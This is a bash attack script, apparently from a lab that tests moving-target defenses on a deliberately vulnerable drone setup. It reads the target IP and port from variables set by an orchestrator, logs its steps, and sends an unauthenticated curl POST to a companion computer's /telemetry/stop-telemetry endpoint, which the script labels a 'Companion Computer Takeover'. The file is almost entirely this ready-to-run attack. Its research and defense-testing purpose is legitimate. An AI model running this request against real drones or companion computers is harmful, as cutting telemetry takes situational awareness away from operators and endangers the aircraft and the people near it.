#!/usr/bin/env bash
set -euo pipefail

# Attack: Companion Computer Takeover (Stop Telemetry via HTTP POST, MTD-aware)
# Target Service: COMPANION_HTTP (Default Port 3000)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (Companion HTTP를 기본으로 가정)
case "${TARGET_SERVICE:-COMPANION_HTTP}" in
    COMPANION_HTTP)
        TARGET_PORT="${TARGET_PORT:-3000}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-COMPANION_HTTP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=companion-computer-takeover src=Companion-Computer-Takeover.md"

log "[BLOCK 1] type=shell (Stop Telemetry via Dynamic HTTP POST)"
# 하드코딩된 주소(localhost:3000) 대신 동적 환경 변수 사용
curl -X POST "http://${TARGET_IP}:${TARGET_PORT}/telemetry/stop-telemetry"

log "[BLOCK 2] type=control (Attack Completed)"
echo "[INFO] Telemetry stop command sent to ${TARGET_IP}:${TARGET_PORT}. Attack flow finished."